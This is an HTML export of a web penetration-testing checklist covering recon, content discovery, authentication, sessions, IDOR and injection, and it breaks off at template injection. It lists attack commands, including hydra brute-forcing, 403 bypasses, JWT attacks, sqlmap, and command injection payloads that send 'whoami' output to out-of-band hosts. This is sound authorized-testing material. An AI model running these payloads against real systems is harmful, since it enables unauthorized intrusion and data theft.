.sizing.reset-size3.size4{font-size:1.1428571429em}.katex .fontsize-ensurer.reset-size3.size5,.katex .sizing.reset-size3.size5{font-size:1.2857142857em}.katex .fontsize-ensurer.reset-size3.size6,.katex .sizing.reset-size3.size6{font-size:1.4285714286em}.katex .fontsize-ensurer.reset-size3.size7,.katex .sizing.reset-size3.size7{font-size:1.7142857143em}.katex .fontsize-ensurer.reset-size3.size8,.katex .sizing.reset-size3.size8{font-size:2.0571428571em}.katex .fontsize-ensurer.reset-size3.size9,.katex .sizing.reset-size3.size9{font-size:2.4685714286em}.katex .fontsize-ensurer.reset-size3.size10,.katex .sizing.reset-size3.size10{font-size:2.9628571429em}.katex .fontsize-ensurer.reset-size3.size11,.katex .sizing.reset-size3.size11{font-size:3.5542857143em}.katex .fontsize-ensurer.reset-size4.size1,.katex .sizing.reset-size4.size1{font-size:.625em}.katex .fontsize-ensurer.reset-size4.size2,.katex .sizing.reset-size4.size2{font-size:.75em}.katex .fontsize-ensurer.reset-size4.size3,.katex .sizing.reset-size4.size3{font-size:.875em}.katex .fontsize-ensurer.reset-size4.size4,.katex .sizing.reset-size4.size4{font-size:1em}.katex .fontsize-ensurer.reset-size4.size5,.katex .sizing.reset-size4.size5{font-size:1.125em}.katex .fontsize-ensurer.reset-size4.size6,.katex .sizing.reset-size4.size6{font-size:1.25em}.katex .fontsize-ensurer.reset-size4.size7,.katex .sizing.reset-size4.size7{font-size:1.5em}.katex .fontsize-ensurer.reset-size4.size8,.katex .sizing.reset-size4.size8{font-size:1.8em}.katex .fontsize-ensurer.reset-size4.size9,.katex .sizing.reset-size4.size9{font-size:2.16em}.katex .fontsize-ensurer.reset-size4.size10,.katex .sizing.reset-size4.size10{font-size:2.5925em}.katex .fontsize-ensurer.reset-size4.size11,.katex .sizing.reset-size4.size11{font-size:3.11em}.katex .fontsize-ensurer.reset-size5.size1,.katex .sizing.reset-size5.size1{font-size:.5555555556em}.katex .fontsize-ensurer.reset-size5.size2,.katex .sizing.reset-size5.size2{font-size:.6666666667em}.katex .fontsize-ensurer.reset-size5.size3,.katex .sizing.reset-size5.size3{font-size:.7777777778em}.katex .fontsize-ensurer.reset-size5.size4,.katex .sizing.reset-size5.size4{font-size:.8888888889em}.katex .fontsize-ensurer.reset-size5.size5,.katex .sizing.reset-size5.size5{font-size:1em}.katex .fontsize-ensurer.reset-size5.size6,.katex .sizing.reset-size5.size6{font-size:1.1111111111em}.katex .fontsize-ensurer.reset-size5.size7,.katex .sizing.reset-size5.size7{font-size:1.3333333333em}.katex .fontsize-ensurer.reset-size5.size8,.katex .sizing.reset-size5.size8{font-size:1.6em}.katex .fontsize-ensurer.reset-size5.size9,.katex .sizing.reset-size5.size9{font-size:1.92em}.katex .fontsize-ensurer.reset-size5.size10,.katex .sizing.reset-size5.size10{font-size:2.3044444444em}.katex .fontsize-ensurer.reset-size5.size11,.katex .sizing.reset-size5.size11{font-size:2.7644444444em}.katex .fontsize-ensurer.reset-size6.size1,.katex .sizing.reset-size6.size1{font-size:.5em}.katex .fontsize-ensurer.reset-size6.size2,.katex .sizing.reset-size6.size2{font-size:.6em}.katex .fontsize-ensurer.reset-size6.size3,.katex .sizing.reset-size6.size3{font-size:.7em}.katex .fontsize-ensurer.reset-size6.size4,.katex .sizing.reset-size6.size4{font-size:.8em}.katex .fontsize-ensurer.reset-size6.size5,.katex .sizing.reset-size6.size5{font-size:.9em}.katex .fontsize-ensurer.reset-size6.size6,.katex .sizing.reset-size6.size6{font-size:1em}.katex .fontsize-ensurer.reset-size6.size7,.katex .sizing.reset-size6.size7{font-size:1.2em}.katex .fontsize-ensurer.reset-size6.size8,.katex .sizing.reset-size6.size8{font-size:1.44em}.katex .fontsize-ensurer.reset-size6.size9,.katex .sizing.reset-size6.size9{font-size:1.728em}.katex .fontsize-ensurer.reset-size6.size10,.katex .sizing.reset-size6.size10{font-size:2.074em}.katex .fontsize-ensurer.reset-size6.size11,.katex .sizing.reset-size6.size11{font-size:2.488em}.katex .fontsize-ensurer.reset-size7.size1,.katex .sizing.reset-size7.size1{font-size:.4166666667em}.katex .fontsize-ensurer.reset-size7.size2,.katex .sizing.reset-size7.size2{font-size:.5em}.katex .fontsize-ensurer.reset-size7.size3,.katex .sizing.reset-size7.size3{font-size:.5833333333em}.katex .fontsize-ensurer.reset-size7.size4,.katex .sizing.reset-size7.size4{font-size:.6666666667em}.katex .fontsize-ensurer.reset-size7.size5,.katex .sizing.reset-size7.size5{font-size:.75em}.katex .fontsize-ensurer.reset-size7.size6,.katex .sizing.reset-size7.size6{font-size:.8333333333em}.katex .fontsize-ensurer.reset-size7.size7,.katex .sizing.reset-size7.size7{font-size:1em}.katex .fontsize-ensurer.reset-size7.size8,.katex .sizing.reset-size7.size8{font-size:1.2em}.katex .fontsize-ensurer.reset-size7.size9,.katex .sizing.reset-size7.size9{font-size:1.44em}.katex .fontsize-ensurer.reset-size7.size10,.katex .sizing.reset-size7.size10{font-size:1.7283333333em}.katex .fontsize-ensurer.reset-size7.size11,.katex .sizing.reset-size7.size11{font-size:2.0733333333em}.katex .fontsize-ensurer.reset-size8.size1,.katex .sizing.reset-size8.size1{font-size:.3472222222em}.katex .fontsize-ensurer.reset-size8.size2,.katex .sizing.reset-size8.size2{font-size:.4166666667em}.katex .fontsize-ensurer.reset-size8.size3,.katex .sizing.reset-size8.size3{font-size:.4861111111em}.katex .fontsize-ensurer.reset-size8.size4,.katex .sizing.reset-size8.size4{font-size:.5555555556em}.katex .fontsize-ensurer.reset-size8.size5,.katex .sizing.reset-size8.size5{font-size:.625em}.katex .fontsize-ensurer.reset-size8.size6,.katex .sizing.reset-size8.size6{font-size:.6944444444em}.katex .fontsize-ensurer.reset-size8.size7,.katex .sizing.reset-size8.size7{font-size:.8333333333em}.katex .fontsize-ensurer.reset-size8.size8,.katex .sizing.reset-size8.size8{font-size:1em}.katex .fontsize-ensurer.reset-size8.size9,.katex .sizing.reset-size8.size9{font-size:1.2em}.katex .fontsize-ensurer.reset-size8.size10,.katex .sizing.reset-size8.size10{font-size:1.4402777778em}.katex .fontsize-ensurer.reset-size8.size11,.katex .sizing.reset-size8.size11{font-size:1.7277777778em}.katex .fontsize-ensurer.reset-size9.size1,.katex .sizing.reset-size9.size1{font-size:.2893518519em}.katex .fontsize-ensurer.reset-size9.size2,.katex .sizing.reset-size9.size2{font-size:.3472222222em}.katex .fontsize-ensurer.reset-size9.size3,.katex .sizing.reset-size9.size3{font-size:.4050925926em}.katex .fontsize-ensurer.reset-size9.size4,.katex .sizing.reset-size9.size4{font-size:.462962963em}.katex .fontsize-ensurer.reset-size9.size5,.katex .sizing.reset-size9.size5{font-size:.5208333333em}.katex .fontsize-ensurer.reset-size9.size6,.katex .sizing.reset-size9.size6{font-size:.5787037037em}.katex .fontsize-ensurer.reset-size9.size7,.katex .sizing.reset-size9.size7{font-size:.6944444444em}.katex .fontsize-ensurer.reset-size9.size8,.katex .sizing.reset-size9.size8{font-size:.8333333333em}.katex .fontsize-ensurer.reset-size9.size9,.katex .sizing.reset-size9.size9{font-size:1em}.katex .fontsize-ensurer.reset-size9.size10,.katex .sizing.reset-size9.size10{font-size:1.2002314815em}.katex .fontsize-ensurer.reset-size9.size11,.katex .sizing.reset-size9.size11{font-size:1.4398148148em}.katex .fontsize-ensurer.reset-size10.size1,.katex .sizing.reset-size10.size1{font-size:.2410800386em}.katex .fontsize-ensurer.reset-size10.size2,.katex .sizing.reset-size10.size2{font-size:.2892960463em}.katex .fontsize-ensurer.reset-size10.size3,.katex .sizing.reset-size10.size3{font-size:.337512054em}.katex .fontsize-ensurer.reset-size10.size4,.katex .sizing.reset-size10.size4{font-size:.3857280617em}.katex .fontsize-ensurer.reset-size10.size5,.katex .sizing.reset-size10.size5{font-size:.4339440694em}.katex .fontsize-ensurer.reset-size10.size6,.katex .sizing.reset-size10.size6{font-size:.4821600771em}.katex .fontsize-ensurer.reset-size10.size7,.katex .sizing.reset-size10.size7{font-size:.5785920926em}.katex .fontsize-ensurer.reset-size10.size8,.katex .sizing.reset-size10.size8{font-size:.6943105111em}.katex .fontsize-ensurer.reset-size10.size9,.katex .sizing.reset-size10.size9{font-size:.8331726133em}.katex .fontsize-ensurer.reset-size10.size10,.katex .sizing.reset-size10.size10{font-size:1em}.katex .fontsize-ensurer.reset-size10.size11,.katex .sizing.reset-size10.size11{font-size:1.1996142719em}.katex .fontsize-ensurer.reset-size11.size1,.katex .sizing.reset-size11.size1{font-size:.2009646302em}.katex .fontsize-ensurer.reset-size11.size2,.katex .sizing.reset-size11.size2{font-size:.2411575563em}.katex .fontsize-ensurer.reset-size11.size3,.katex .sizing.reset-size11.size3{font-size:.2813504823em}.katex .fontsize-ensurer.reset-size11.size4,.katex .sizing.reset-size11.size4{font-size:.3215434084em}.katex .fontsize-ensurer.reset-size11.size5,.katex .sizing.reset-size11.size5{font-size:.3617363344em}.katex .fontsize-ensurer.reset-size11.size6,.katex .sizing.reset-size11.size6{font-size:.4019292605em}.katex .fontsize-ensurer.reset-size11.size7,.katex .sizing.reset-size11.size7{font-size:.4823151125em}.katex .fontsize-ensurer.reset-size11.size8,.katex .sizing.reset-size11.size8{font-size:.578778135em}.katex .fontsize-ensurer.reset-size11.size9,.katex .sizing.reset-size11.size9{font-size:.6945337621em}.katex .fontsize-ensurer.reset-size11.size10,.katex .sizing.reset-size11.size10{font-size:.8336012862em}.katex .fontsize-ensurer.reset-size11.size11,.katex .sizing.reset-size11.size11{font-size:1em}.katex .delimsizing.size1{font-family:KaTeX_Size1}.katex .delimsizing.size2{font-family:KaTeX_Size2}.katex .delimsizing.size3{font-family:KaTeX_Size3}.katex .delimsizing.size4{font-family:KaTeX_Size4}.katex .delimsizing.mult .delim-size1>span{font-family:KaTeX_Size1}.katex .delimsizing.mult .delim-size4>span{font-family:KaTeX_Size4}.katex .nulldelimiter{display:inline-block;width:.12em}.katex .delimcenter,.katex .op-symbol{position:relative}.katex .op-symbol.small-op{font-family:KaTeX_Size1}.katex .op-symbol.large-op{font-family:KaTeX_Size2}.katex .accent>.vlist-t,.katex .op-limits>.vlist-t{text-align:center}.katex .accent .accent-body{position:relative}.katex .accent .accent-body:not(.accent-full){width:0}.katex .overlay{display:block}.katex .mtable .vertical-separator{display:inline-block;min-width:1px}.katex .mtable .arraycolsep{display:inline-block}.katex .mtable .col-align-c>.vlist-t{text-align:center}.katex .mtable .col-align-l>.vlist-t{text-align:left}.katex .mtable .col-align-r>.vlist-t{text-align:right}.katex .svg-align{text-align:left}.katex svg{fill:currentColor;stroke:currentColor;display:block;height:inherit;position:absolute;width:100%}.katex svg path{stroke:none}.katex svg{fill-rule:nonzero;fill-opacity:1;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-dasharray:none;stroke-dashoffset:0;stroke-opacity:1}.katex img{border-style:none;max-height:none;max-width:none;min-height:0;min-width:0}.katex .stretchy{display:block;overflow:hidden;position:relative;width:100%}.katex .stretchy:after,.katex .stretchy:before{content:""}.katex .hide-tail{overflow:hidden;position:relative;width:100%}.katex .halfarrow-left{left:0;overflow:hidden;position:absolute;width:50.2%}.katex .halfarrow-right{overflow:hidden;position:absolute;right:0;width:50.2%}.katex .brace-left{left:0;overflow:hidden;position:absolute;width:25.1%}.katex .brace-center{left:25%;overflow:hidden;position:absolute;width:50%}.katex .brace-right{overflow:hidden;position:absolute;right:0;width:25.1%}.katex .x-arrow-pad{padding:0 .5em}.katex .cd-arrow-pad{padding:0 .55556em 0 .27778em}.katex .mover,.katex .munder,.katex .x-arrow{text-align:center}.katex .boxpad{padding:0 .3em}.katex .fbox,.katex .fcolorbox{border:.04em solid;box-sizing:border-box}.katex .cancel-pad{padding:0 .2em}.katex .cancel-lap{margin-left:-.2em;margin-right:-.2em}.katex .sout{border-bottom-style:solid;border-bottom-width:.08em}.katex .angl{border-right:.049em solid;border-top:.049em solid;box-sizing:border-box;margin-right:.03889em}.katex .anglpad{padding:0 .03889em}.katex .eqn-num:before{content:"(" counter(katexEqnNo) ")";counter-increment:katexEqnNo}.katex .mml-eqn-num:before{content:"(" counter(mmlEqnNo) ")";counter-increment:mmlEqnNo}.katex .mtr-glue{width:50%}.katex .cd-vert-arrow{display:inline-block;position:relative}.katex .cd-label-left{display:inline-block;position:absolute;right:calc(50% + .3em);text-align:left}.katex .cd-label-right{display:inline-block;left:calc(50% + .3em);position:absolute;text-align:right}.katex-display{display:block;margin:1em 0;text-align:center}.katex-display>.katex{display:block;text-align:center;white-space:nowrap}.katex-display>.katex>.katex-html{display:block;position:relative}.katex-display>.katex>.katex-html>.tag{position:absolute;right:0}.katex-display.leqno>.katex>.katex-html>.tag{left:0;right:auto}.katex-display.fleqn>.katex{padding-left:2em;text-align:left}body{counter-reset:katexEqnNo mmlEqnNo}
+
+</style>
+<style>
+body {
+    padding-top: 25px;
+}
+</style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <h1 id="part-1%3A-web-application-pentesting-(owasp-%2B-extended)" tabindex="-1">PART 1: WEB APPLICATION PENTESTING (OWASP + Extended)</h1>
+<h2 id="1.1-%E2%80%94-reconnaissance-%26-information-gathering" tabindex="-1">1.1 — Reconnaissance &amp; Information Gathering</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.1.1</td>
+<td>Subdomain Enumeration</td>
+<td>Info</td>
+<td><code>subfinder -d target.com -silent</code> | <code>amass enum -passive -d target.com</code> | <code>assetfinder --subs-only target.com</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.2</td>
+<td>Subdomain Bruteforce</td>
+<td>Info</td>
+<td><code>ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.3</td>
+<td>DNS Zone Transfer</td>
+<td>Info</td>
+<td><code>dig axfr @ns1.target.com target.com</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.4</td>
+<td>Certificate Transparency</td>
+<td>Info</td>
+<td><code>curl -s &quot;https://crt.sh/?q=%25.target.com&amp;output=json&quot; | jq -r '.[].name_values' | sort -u</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.5</td>
+<td>Google Dorking</td>
+<td>Info</td>
+<td><code>site:target.com inurl:admin | filetype:pdf | intitle:&quot;index of&quot;</code> — use GHDB</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.6</td>
+<td>Wayback Machine / Archived Files</td>
+<td>Info</td>
+<td><code>waybackurls target.com | sort -u &gt; wb.txt</code> | <code>gau target.com</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.7</td>
+<td>Technology Fingerprinting</td>
+<td>Info</td>
+<td><code>whatweb https://target.com</code> | <code>wappalyzer</code> (browser) | <code>httpx -tech-detect</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.8</td>
+<td>JS File Analysis (secrets/endpoints)</td>
+<td>High if leaked</td>
+<td><code>katana -u https://target.com -d 3 -js -o js.txt</code> → <code>nuclei -l js.txt -t exposures/</code> | run <code>secretfinder</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.9</td>
+<td>Identify .git/.svn/.env exposure</td>
+<td>Critical</td>
+<td><code>curl -s https://target.com/.git/HEAD</code> | <code>git-dumper https://target.com/.git/ ./repo</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.10</td>
+<td>Cloud Storage Bucket Discovery</td>
+<td>High</td>
+<td><code>s3scanner scan --bucket-file buckets.txt</code> | grep for <code>S3_BUCKET</code> in JS</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.11</td>
+<td>Port Scan (Full TCP + Top UDP)</td>
+<td>Info</td>
+<td><code>nmap -sS -p- --min-rate 5000 -oN full.txt target.com</code> then <code>nmap -sC -sV -p &lt;ports&gt; target.com</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.12</td>
+<td>WAF/CDN Detection</td>
+<td>Info</td>
+<td><code>wafw00f https://target.com</code> | <code>nmap --script http-waf-detect,http-waf-fingerprint -p 443 target.com</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.13</td>
+<td>Shodan/Censys/FOFA Recon</td>
+<td>Info</td>
+<td><code>shodan search &quot;ssl.cert.subject.CN:target.com&quot;</code> | <code>censys search &quot;target.com&quot;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.14</td>
+<td>Email Harvesting (for phishing/pw reuse)</td>
+<td>Info</td>
+<td><code>theHarvester -d target.com -b all</code> | <code>hunter.io</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.1.15</td>
+<td>Identify hosting/IP behind CDN (historical)</td>
+<td>Info</td>
+<td>SecurityTrails,<code>viewdns.info/history</code>, crt.sh IP history</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.2-%E2%80%94-content-discovery-%26-mapping" tabindex="-1">1.2 — Content Discovery &amp; Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.2.1</td>
+<td>Directory/File Bruteforce</td>
+<td>Info</td>
+<td><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://target.com/FUZZ -mc 200,204,301,302,307,401,403 -recursion</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.2</td>
+<td>Extension Bruteforce</td>
+<td>Info</td>
+<td><code>ffuf -u https://target.com/indexFUZZ -w ext.txt</code> (.bak, .old, .txt, .zip, .tar.gz, .sql)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.3</td>
+<td>Backup File Discovery</td>
+<td>High</td>
+<td><code>backup-doms.sh</code> / ffuzz <code>.bak .old .orig .swp ~</code> patterns</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.4</td>
+<td>Swagger/OpenAPI endpoints exposed</td>
+<td>High</td>
+<td><code>ffuf -u https://target.com/FUZZ -w api-paths.txt</code> → <code>/swagger.json /openapi.json /api-docs /graphql</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.5</td>
+<td>robots.txt / sitemap.xml parsing</td>
+<td>Info</td>
+<td><code>curl -s https://target.com/robots.txt</code> — note Disallow entries, they are your target list</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.6</td>
+<td>Forced Browsing (403/401 bypass check)</td>
+<td>High</td>
+<td><code>ffuf -u https://target.com/admin -H &quot;X-Original-URL: /admin&quot;</code> | try path traversal variants <code>/admin..;/</code> <code>//admin</code> <code>/./admin</code> <code>/admin%20</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.7</td>
+<td>Identify all parameters (Arjun)</td>
+<td>Info</td>
+<td><code>arjun -u https://target.com/page -m GET,POST,JSON</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.8</td>
+<td>Hidden parameter fuzzing</td>
+<td>Medium</td>
+<td><code>param-miner</code> (Burp extension) | <code>x8 -u https://target.com -w params.txt</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.9</td>
+<td>Crawling &amp; Authenticated Spider</td>
+<td>Info</td>
+<td>Burp crawl mode,<code>hakrawler -u https://target.com -depth 3</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.2.10</td>
+<td>Version-Diff (identify JS/API version changes)</td>
+<td>Low</td>
+<td><code>urlscan.io</code> history, compare JS hashes</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.3-%E2%80%94-authentication-testing" tabindex="-1">1.3 — Authentication Testing</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.3.1</td>
+<td>Username Enumeration (login/forgot-pw/register)</td>
+<td>Medium</td>
+<td>Trigger differential responses:<code>ffuf -u https://target.com/login -d &quot;user=FUZZ&amp;pass=x&quot; -w users.txt -mr &quot;invalid user&quot;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.2</td>
+<td>Default/Credential Bruteforce</td>
+<td>Critical</td>
+<td><code>hydra -L users.txt -P rockyou.txt target.com http-post-form &quot;/login:user=^USER^&amp;pass=^PASS^:F=failed&quot;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.3</td>
+<td>Password Policy Weakness</td>
+<td>Medium</td>
+<td>Register/reset with<code>a</code>, <code>123</code> — confirm no complexity enforcement</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.4</td>
+<td>No Rate Limiting / No Account Lockout</td>
+<td>High</td>
+<td>Burp Intruder: 100 failed logins → still no lockout? Turbo Intruder for speed</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.5</td>
+<td>Brute-force protections bypass</td>
+<td>High</td>
+<td>Change<code>X-Forwarded-For: FUZZ</code> per request; rotate user-agent; add <code>null</code> byte in creds</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.6</td>
+<td>Weak Password Reset Implementation</td>
+<td>Critical</td>
+<td>Test: token reuse, token leakage (referrer), user-controlled reset email, predictable tokens, no expiry</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.7</td>
+<td>Session Fixation on Login</td>
+<td>High</td>
+<td>Grab pre-auth cookie → login → does cookie value stay same?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.8</td>
+<td>Remember-Me token flaws</td>
+<td>High</td>
+<td>Check if token = static hash, reversible, non-expiring</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.9</td>
+<td>MFA Bypass</td>
+<td>Critical</td>
+<td>Test: response manipulation (<code>&quot;success&quot;:true</code>), null OTP, OTP reuse, race condition, brute-force 4-digit OTP without lockout, direct-to-dashboard endpoints</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.10</td>
+<td>Credential Stuffing feasibility</td>
+<td>High</td>
+<td>Check login error uniformity + rate limits</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.11</td>
+<td>OAuth/SSO Misconfig</td>
+<td>High</td>
+<td>Test: open redirect on<code>redirect_uri</code>, missing <code>state</code> (CSRF), token leakage to referrer, implicit flow token exposure</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.12</td>
+<td>JWT Attacks</td>
+<td>Critical</td>
+<td><code>jwt_tool &lt;token&gt;</code> — check <code>alg:none</code>, weak HMAC secret (<code>jwt_tool -C -d rockyou.txt</code>), <code>kid</code> injection, <code>jku</code>/<code>x5u</code> SSRF, alg confusion RS256→HS256</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.13</td>
+<td>Password in URL/Logs</td>
+<td>Medium</td>
+<td>Check GET-based login, tokens in query strings</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.3.14</td>
+<td>Logout doesn't invalidate session</td>
+<td>Medium</td>
+<td>Logout → replay old session token → still valid?</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.4-%E2%80%94-session-management" tabindex="-1">1.4 — Session Management</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.4.1</td>
+<td>Cookie attributes missing (Secure/HttpOnly/SameSite)</td>
+<td>Low</td>
+<td><code>curl -sI https://target.com</code> — inspect Set-Cookie flags</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.4.2</td>
+<td>Session token entropy</td>
+<td>High</td>
+<td>Collect 1000 tokens → check sequential/predictable (<code>burp sequencer</code>)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.4.3</td>
+<td>Session not rotated after login/privilege change</td>
+<td>High</td>
+<td>Compare pre/post-auth cookie</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.4.4</td>
+<td>Concurrent sessions allowed</td>
+<td>Low</td>
+<td>Login same user 2 browsers → old session invalid?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.4.5</td>
+<td>Session timeout missing (long idle)</td>
+<td>Low</td>
+<td>Leave session idle 8+ hours → still valid?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.4.6</td>
+<td>CSRF token missing on state-changing requests</td>
+<td>Medium</td>
+<td>Burp → remove token → request still succeeds?</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.5-%E2%80%94-authorization-%26-access-control-(idor-focus-%E2%80%94-real-world-finding)" tabindex="-1">1.5 — Authorization &amp; Access Control (IDOR focus — <span class="obsidian-tag">#1</span> real-world finding)</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.5.1</td>
+<td>IDOR on GET (objects/IDs)</td>
+<td>High/Critical</td>
+<td>Capture request → swap<code>id=1234</code> → <code>id=1235</code> — response changes to other user's data? Use Autorize/Burp Match-Replace</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.2</td>
+<td>IDOR on POST/PUT/DELETE</td>
+<td>Critical</td>
+<td>Same object-swap on write operations (change email, delete resource of others)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.3</td>
+<td>IDOR in UUID/GUID (verify non-enumerable, but still test)</td>
+<td>High</td>
+<td>Swap UUIDs between accounts</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.4</td>
+<td>Horizontal PrivEsc (user→user)</td>
+<td>Critical</td>
+<td>Low-priv user A → access user B's resources</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.5</td>
+<td>Vertical PrivEsc (user→admin)</td>
+<td>Critical</td>
+<td>Access<code>/admin/*</code> endpoints as normal user; remove role from request body</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.6</td>
+<td>Function-level auth bypass</td>
+<td>Critical</td>
+<td>Access admin JS functions/URLs directly:<code>/admin/deleteUser.php?id=1</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.7</td>
+<td>Mass Assignment / Parameter Pollution</td>
+<td>High</td>
+<td>Add<code>role=admin</code>, <code>isAdmin=true</code>, <code>price=1</code>, <code>user_id=victim</code> to registration/profile update</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.8</td>
+<td>HTTP Method Bypass</td>
+<td>High</td>
+<td><code>curl -X PUT/DELETE/PATCH https://target.com/api/user/1</code> — methods not blocked? <code>OPTIONS</code> check</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.9</td>
+<td>Forcing Browsing to authenticated pages unauthenticated</td>
+<td>High</td>
+<td>curl admin URL in incognito</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.10</td>
+<td>Verb Tampering on auth checks</td>
+<td>High</td>
+<td><code>HEAD</code> requests, mixed-case URLs, trailing dots/slashes</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.11</td>
+<td>Referer-based access control</td>
+<td>Medium</td>
+<td>Remove/change Referer header — auth still enforced?</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.5.12</td>
+<td>Step-skipping in multi-step flows</td>
+<td>High</td>
+<td>Jump to step 3 of checkout/wizard directly</td>
+<td>☐\</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1.6-%E2%80%94-injection-flaws" tabindex="-1">1.6 — Injection Flaws</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.6.1</td>
+<td>SQL Injection (Error-based)</td>
+<td>Critical</td>
+<td><code>' &quot; \</code>) -- -+ in all params → grep <code>sql syntax, mysql, oracle, sqlite</code> in response</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.2</td>
+<td>SQLi (sqlmap — authorized scope ONLY)</td>
+<td>Critical</td>
+<td><code>sqlmap -u &quot;https://target.com/item?id=1&quot; --batch --dbs --random-agent --tamper=space2comment</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.3</td>
+<td>Blind/Time-based SQLi</td>
+<td>Critical</td>
+<td><code>sqlmap -u URL --technique=BT --level=5 --risk=3</code> | manual <code>1' AND SLEEP(5)-- -</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.4</td>
+<td>Second-order SQLi</td>
+<td>Critical</td>
+<td>Inject in profile field → trigger elsewhere (search/admin panel)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.5</td>
+<td>NoSQL Injection</td>
+<td>Critical</td>
+<td>`'</td>
+<td></td>
+</tr>
+<tr>
+<td>1.6.6</td>
+<td>OS Command Injection</td>
+<td>Critical</td>
+<td><code>; id</code> | <code>&amp;&amp; id</code> | <code>`id`</code> | <code>$(id)</code> — verify with OOB: <code>; curl http://your-collab.burpcollab.net/$(whoami)</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.7</td>
+<td>Blind Command Injection (OOB)</td>
+<td>Critical</td>
+<td><code>; nslookup `whoami`.oob.example.com</code> | Burp Collaborator | interactsh (<code>interactsh-client</code>)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>1.6.8</td>
+<td>Template Injection (SSTI)</td>
+<td>Critical</td>
